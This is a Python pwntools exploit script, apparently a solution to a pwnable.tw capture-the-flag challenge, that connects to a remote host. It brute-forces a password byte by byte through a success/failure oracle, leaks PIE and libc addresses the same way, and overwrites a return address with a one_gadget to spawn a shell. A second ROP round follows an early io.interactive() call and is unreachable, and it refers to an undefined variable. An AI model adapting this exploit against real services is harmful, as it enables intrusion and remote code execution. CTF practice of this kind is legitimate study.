from pwn import *
#import ctypes
#io = remote('127.0.0.1', 4000)
#io = remote('chall.pwnablw.tw', 10205)
io = remote('139.162.123.119', 10205)
#libc = ctypes.CDLL("./libc_64.so.6")
def get_pass():
    password = ''
    while(len(password) < 16):
        for i in range(1, 256):
            io.recvuntil('>> ')
            io.send('1')

            io.recvuntil(' :')
            passwd = password + chr(i) + '\x00'
            io.send(passwd)
            rec = io.recvline()[:-1]
            if 'Success' in rec:
                io.recvuntil('>> ')
                io.send('1')
                password += chr(i)
                print(password.encode('hex'))
                break
            
    return password

def leak_libc():
    libc = ''
    while(len(libc) < 6):
        for i in range(1, 256):
            io.recvuntil('>> ')
            io.send('1')

            io.recvuntil(' :')
            io.send('a'*8 + libc + chr(i) + '\x00')
            rec = io.recvline()
            if 'Success' in rec:
                io.recvuntil('>> ')
                io.send('1')
                libc += chr(i)
                break
    return u64(libc.ljust(8, '\x00'))

def leak_pie():
    PIE = ''
    while(len(PIE) < 6):
        for i in range(1, 256):
            io.recvuntil('>> ')
            io.send('1')

            io.recvuntil(' :')
            io.send(PIE + chr(i) + '\x00')
            rec = io.recvline()
            if 'Success' in rec:
                io.recvuntil('>> ')
                io.send('1')
                PIE += chr(i)
                print('found :' + hex(i))
                break
    return u64(PIE.ljust(8, '\x00'))

def copy(payload):
    s = payload
    if s[0] == '\x00':
        fbyte = 'a'
    else:
        fbyte = s[0]
    while(len(s) > 0):
        if s[-1] == '\x00':
            ss = '\x00' + s[1:-1].replace('\x00', 'a')
            io.recvuntil('>> ')
            io.send('1'*16)
            io.recvuntil(' :')
            if ss == '\x00':
                io.send('\x00')
            else:
                io.send(ss + '\x00')
            s = s[:-1]
            rec = io.recvline()
            if 'Success' in rec:
                io.recvuntil('>> ')
                io.send('3'*16)
                io.recvuntil(' :')
                io.send(fbyte)
                io.recvuntil('>> ')
                io.send('1'*16)
            else:
                print('something wrong')
            print(repr(ss+'\x00') + '-> to copy')
        else:
            s = s[:-1]

#round 1
passwd = get_pass()
print('passwd1 get :' + passwd.encode('hex'))

io.recvuntil('>> ')
io.send('1')
io.recvuntil(' :')
io.send(passwd + '\x00' + 'a'*0x2f)
io.recvuntil('>> ')
#raw_input()
io.send('3')
io.recvuntil(' :')
io.send('a'*0x3f)
io.recvuntil('>> ')
io.send('1')

#raw_input()
pie = leak_pie()
pie = pie - 0xb70
print(hex(pie))
#pie = pie - 0xb70
#raw_input()

io.recvuntil('>> ')
io.send('1')
io.recvuntil(' :')
io.send(p64(pie) + 'a'*0x40)
io.recvuntil('>> ')
io.send('3')
io.recvuntil(' :')
io.send('a'*0x3f)
io.recvuntil('>> ')
io.send('1')

libc = leak_libc()
libc = libc - 0x78439
print(hex(libc))
#raw_input()

one_gadget = libc + 0xf0567

io.recvuntil('>> ')
io.send('1')
io.recvuntil(' :')
io.send('a'*8 + p64(libc+0x78439) + 'a'*0x30 + passwd + '\x00')
io.recvuntil('>> ')
io.send('3')
io.recvuntil(' :')
io.send('a'*0x3f)
io.recvuntil('>> ')
io.send('1')

payload = 'a'*0x40 + passwd + '1'*16 + p64(pie+0x1060) + p64(one_gadget)
copy(payload)

#raw_input()
#io.interactive()




#main = pie + 0xed7
#payload = 'a' * 0x40 + passwd + '1'*16 + p64(pie+0x202a00) + p64(main)
#print('!')
#copy(payload)
#raw_input()
io.recvuntil('>> ')
io.send('1'*16)
io.recvuntil(' :')
io.send('\x00')
io.recvuntil('>> ')
raw_input('123')
io.send('2'*16)
#raw_input('before end')
io.interactive()

#round 2
pop_rdi = pie + 0x10c3
puts_plt = pie+0xae0
puts_got = pie+0x201f60
leave_ret = pie + 0x1051

io.send('1'*16)
passwd = get_pass()
print('passwd2 get :' + passwd.encode('hex'))
payload = p64(pie+0x202c10) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) + 'a'*0x18 + passwd + '1'*16 + p64(pie+0x202a00-0x60) + p64(main)
copy(payload)

raw_input('shell')
io.recvuntil('>> ')
io.send('1'*16)
io.recvuntil(' :')
io.send('\x00')
io.recvuntil('>> ')
#raw_input('shell')
io.send('2'*16)

#libc = u64(io.recvuntil('\x7f').ljust(8, '\x00'))
#print('libc :' + hex(libc))



io.interactive()



